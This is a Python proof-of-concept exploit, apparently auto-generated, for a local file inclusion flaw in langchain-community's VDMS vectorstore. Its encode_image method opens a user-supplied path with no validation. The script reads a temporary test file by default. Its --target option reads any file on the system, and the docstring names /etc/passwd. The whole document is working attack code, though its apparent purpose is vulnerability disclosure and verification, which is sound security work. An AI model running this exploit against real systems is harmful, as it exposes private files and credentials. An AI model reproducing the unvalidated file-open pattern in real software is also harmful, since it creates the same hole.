#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-007
# Sink: encode_image
# Auto-generated — run with: python3 lfi_uris_external_input_passes_encode_image.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in
langchain-community's VDMS vectorstore.

Vulnerability: The `encode_image` method uses user-supplied `image_path` directly
in `open()` without any validation. Both `add_images` (the intended entry point)
and `encode_image` itself accept arbitrary paths, allowing an attacker to read
any file on the system.

This PoC demonstrates the vulnerability by:
1. Creating a harmless test file.
2. Calling `encode_image` with the path to that file.
3. Decoding and displaying the file content.
4. (Optionally) reading `/etc/passwd` if a benign demonstration is not desired.

Usage:
    python poc.py [--target /path/to/read]

Dependencies:
    - Python 3.6+
    - langchain-community (available at /tmp/langchain-community-only)
    - vdms library (usually installed with langchain-community)
    - numpy (for MockEmbedding)
"""

import argparse
import base64
import os
import sys
import tempfile

# Add the vulnerable library to path
sys.path.insert(0, "/tmp/langchain-community-only")

try:
    from langchain_community.vectorstores.vdms import VDMS
except ImportError as e:
    print(f"[!] Failed to import VDMS: {e}")
    print("[!] Make sure langchain-community is installed at /tmp/langchain-community-only")
    sys.exit(1)

# A minimal embedding function (the class requires one even if we never use it)
class MockEmbedding:
    def embed_images(self, uris):
        # Return dummy embeddings: each image gets a zero vector
        return [[0.0] * 128 for _ in uris]

    def embed_documents(self, texts):
        # Required by the interface
        return [[0.0] * 128 for _ in texts]

    def embed_query(self, text):
        return [0.0] * 128


def main():
    parser = argparse.ArgumentParser(
        description="LFI PoC for langchain-community VDMS"
    )
    parser.add_argument(
        "--target",
        default=None,
        help="File path to read (default: create and read a temporary test file)",
    )
    args = parser.parse_args()

    # Use a safe default: create a temporary file with known content
    if args.target is None:
        # Write a test message to a temporary file
        safe_content = "LFI PoC succeeded!\n"
        with tempfile.NamedTemporaryFile(delete=False, mode="w", suffix=".txt") as f:
            f.write(safe_content)
            test_file = f.name
        target_path = test_file
        cleanup_file = True
    else:
        target_path = args.target
        cleanup_file = False

    print(f"[*] Target file: {target_path}")

    # Instantiate VDMS with mocked embedding and dummy connection details.
    # The connection will not be used because the vulnerable `open` happens first.
    vdms = VDMS(
        embedding=MockEmbedding(),
        host="localhost",
        port=55555,               # Unused, can be any port
        index="test",
    )

    # Call the vulnerable method directly (encode_image is public)
    print("[*] Attempting to read file via encode_image...")
    try:
        b64_data = vdms.encode_image(image_path=target_path)
    except Exception as e:
        print(f"[!] Error during file read: {e}")
        if cleanup_file:
            os.unlink(test_file)
        sys.exit(1)

    # Decode and display the content
    try:
        raw_content = base64.b64decode(b64_data).decode("utf-8")
        print("[+] File content (base64 decoded):")
        print(raw_content)
    except Exception:
        # Binary file or non-UTF8 – show base64
        print("[+] File content (base64):")
        print(b64_data)

    # Optionally show that add_images also works (with successful file read)
    # We can call add_images, but it will try to embed and then connect to server.
    # For a clean demo, skip this – the encode_image call already proves the flaw.
    print("\n[*] Vulnerability confirmed: unvalidated path passed to open().")

    # Clean up test file if we created one
    if cleanup_file:
        os.unlink(test_file)
        print(f"[*] Removed temporary file: {test_file}")


if __name__ == "__main__":
    main()
